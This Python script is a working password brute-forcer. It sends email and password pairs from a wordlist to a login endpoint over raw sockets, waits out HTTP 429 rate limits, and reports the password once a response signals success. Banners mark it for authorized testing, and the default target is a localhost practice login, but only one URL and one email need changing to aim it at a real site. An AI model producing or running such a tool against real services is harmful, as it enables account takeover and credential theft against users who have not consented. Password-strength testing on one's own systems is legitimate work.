import socket
import ssl
import time
import json
from urllib.parse import urlparse

# ============================================
# FOR AUTHORIZED TESTING ONLY
# Uses ONLY built-in Python libraries
# ============================================

def http_post(host, port, path, data, use_ssl=False, timeout=10):
    """Send HTTP POST request using raw sockets."""
    body = json.dumps(data)
    
    request = f"POST {path} HTTP/1.1\r\n"
    request += f"Host: {host}:{port}\r\n"
    request += "Content-Type: application/json\r\n"
    request += f"Content-Length: {len(body)}\r\n"
    request += "Connection: close\r\n"
    request += "\r\n"
    request += body
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        if use_ssl:
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        
        sock.connect((host, port))
        sock.sendall(request.encode())
        
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        response_text = response.decode('utf-8', errors='ignore')
        
        if '\r\n\r\n' in response_text:
            headers, body = response_text.split('\r\n\r\n', 1)
        else:
            headers = response_text
            body = ""
        
        status_line = headers.split('\r\n')[0] if headers else ""
        status_code = 0
        if 'HTTP/' in status_line:
            parts = status_line.split(' ')
            if len(parts) >= 2:
                try:
                    status_code = int(parts[1])
                except:
                    pass
        
        return {
            'status_code': status_code,
            'headers': headers,
            'body': body
        }
    
    except Exception as e:
        return {'error': str(e)}
    
    finally:
        sock.close()


def brute_force(url, wordlist_path, email_field='email', password_field='password', target_email='user@gmail.com'):
    """
    Brute force - shows every password tested and stops when found.
    """
    
    # Parse URL
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    use_ssl = parsed.scheme == 'https'
    
    # Read wordlist
    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print("=" * 60)
    print("  BRUTE FORCE TEST - FOR AUTHORIZED USE ONLY")
    print("=" * 60)
    print(f"  Target:  {host}:{port}{path}")
    print(f"  Email:   {target_email}")
    print(f"  Passwords to test: {len(passwords)}")
    print(f"  SSL:     {use_ssl}")
    print("=" * 60)
    print()
    
    start_time = time.time()
    
    for i, password in enumerate(passwords):
        try:
            # Show current attempt
            attempt_num = i + 1
            percent = (attempt_num / len(passwords)) * 100
            print(f"[{attempt_num}/{len(passwords)}] ({percent:.1f}%) Testing: '{password}'", end="")
            
            # Prepare data
            data = {
                email_field: target_email,
                password_field: password
            }
            
            # Send request
            result = http_post(host, port, path, data, use_ssl)
            
            if 'error' in result:
                print(f" Connection error: {result['error']}")
                time.sleep(2)
                continue
            
            status = result['status_code']
            body_text = result['body'].lower()
            
            # Check for rate limiting
            if status == 429:
                print(f" RATE LIMITED - waiting 5 seconds...")
                time.sleep(5)
                continue
            
            # Check if login successful
            success = False
            message = ""
            
            if status == 200:
                try:
                    json_response = json.loads(result['body'])
                    if json_response.get('success'):
                        success = True
                        message = json_response.get('message', 'Success')
                except:
                    if 'success' in body_text and 'welcome' in body_text:
                        success = True
                        message = "Login successful"
            
            if success:
                elapsed = time.time() - start_time
                print(f"  FOUND!")
                print()
                print("=" * 60)
                print("  🎉 PASSWORD FOUND!")
                print("=" * 60)
                print(f"  Password:  {password}")
                print(f"  Attempt:   {attempt_num} of {len(passwords)}")
                print(f"  Time:      {elapsed:.1f} seconds")
                print(f"  Speed:     {attempt_num/elapsed:.1f} attempts/sec")
                print(f"  Message:   {message}")
                print("=" * 60)
                return password
            elif status == 401:
                print(f" ❌ Wrong")
            elif status == 403:
                print(f" 🚫 Forbidden")
            elif status == 404:
                print(f" 🔍 Not Found")
            else:
                print(f" ❓ Status: {status}")
            
            # Small delay
            time.sleep(0.3)
            
        except KeyboardInterrupt:
            print("\n\n[!] Stopped by user (Ctrl+C)")
            break
        except Exception as e:
            print(f" ❌ Error: {e}")
            time.sleep(1)
    
    # Not found
    elapsed = time.time() - start_time
    print()
    print("=" * 60)
    print("  ❌ PASSWORD NOT FOUND")
    print("=" * 60)
    print(f"  Tested:    {len(passwords)} passwords")
    print(f"  Time:      {elapsed:.1f} seconds")
    print(f"  Target:    {target_email}")
    print("=" * 60)
    return None


# ============================================
# Run the test
# ============================================
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║  FOR AUTHORIZED TESTING ONLY         ║
    ║  Test on YOUR OWN local server       ║
    ╚══════════════════════════════════════╝
    """)
    
    # Change these settings
    TARGET_URL = "http://localhost:4000/practice-login"
    WORDLIST_FILE = "wordlist.txt"
    TARGET_EMAIL = "user@gmail.com"
    
    brute_force(
        url=TARGET_URL,
        wordlist_path=WORDLIST_FILE,
        email_field="email",
        password_field="password",
        target_email=TARGET_EMAIL
    )
